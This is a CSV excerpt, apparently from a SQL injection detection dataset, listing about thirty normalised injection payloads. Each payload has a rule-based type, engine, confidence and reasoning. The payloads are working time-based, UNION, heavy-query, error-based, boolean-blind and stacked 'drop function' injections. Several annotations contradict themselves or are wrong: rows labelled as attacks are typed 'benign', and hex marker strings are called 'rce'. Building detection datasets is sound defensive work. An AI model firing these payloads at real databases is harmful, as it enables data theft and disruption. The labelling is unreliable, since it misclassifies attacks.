row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
7080,"1' ) as dajk where 1452 = 1452 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",1,,rce,generic,0.95,0x4b774c75 detected — rce injection (priority 1) on generic,rule-based
7081,"1"" ) where 5850 = 5850 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
7082,"1"" union all select null,null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
7083,if ( 5127 = 2829 ) select 5127 else drop function okos--,1,,stacked_queries,generic,0.95,drop function detected — stacked_queries injection (priority 3) on generic,rule-based
7084,1' ) ) and 4650 = 1322#,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7085,-9355' or ( 8459 = 8459 ) *4906 and 'aegf' = 'aegf,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7086,1' union all select null--,1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
7087,"1 ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
7088,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7089,1 and ( 5369 = 8325 ) *8325# psze,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7090,"-5196"" ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( ""gbcq"" like ""gbcq",1,,error_based,oracle,0.95,ctxsys detected — error_based injection (priority 4) on oracle,rule-based
7091,"1'+ ( select 'jfir' where 7814 = 7814 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) ) +'",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
7092,"1%"" ) ) ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
7093,"1' or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and 'obax' like 'obax",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
7094,-1641' union all select 4835#,1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
7095,1 and 9198 = 9198--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7096,"1"" ) where 9115 = 9115",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7097,"1 ) ) as xovu where 4530 = 4530 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers detected — heavy_query injection (priority 6) on generic",rule-based
7098,1'|| ( select 'mwpd' where 2887 = 2887,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7099,"1"" rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) )",1,,boolean_blind,generic,0.95,rlike  detected — boolean_blind injection (priority 8) on generic,rule-based
7100,"-9062"" or 6872 = 6872 and ""aumq"" like ""aumq",1,,boolean_blind,generic,0.95,"6872 = 6872 and, like "" detected — boolean_blind injection (priority 8) on generic",rule-based
7101,"1%"" ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ""%"" = """,1,,heavy_query,generic,0.95,"select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers detected — heavy_query injection (priority 6) on generic",rule-based
7102,1 where 2956 = 2956,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7103,"1%' and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
7104,-4542' ) ) order by 1#,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7105,"1%"" ) ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( ( ""%"" = """,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
7106,"-1432"" ) ) union all select 9008,9008,9008#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
7107,"1"" ) ) and 8329 = 5584#",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7108,1 ) as imdt where 6431 = 6431,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7109,"1"" ) as jidc where 6093 = 6093 and 9198 = 9198--",1,,boolean_blind,generic,0.95,6093 = 6093 and detected — boolean_blind injection (priority 8) on generic,rule-based
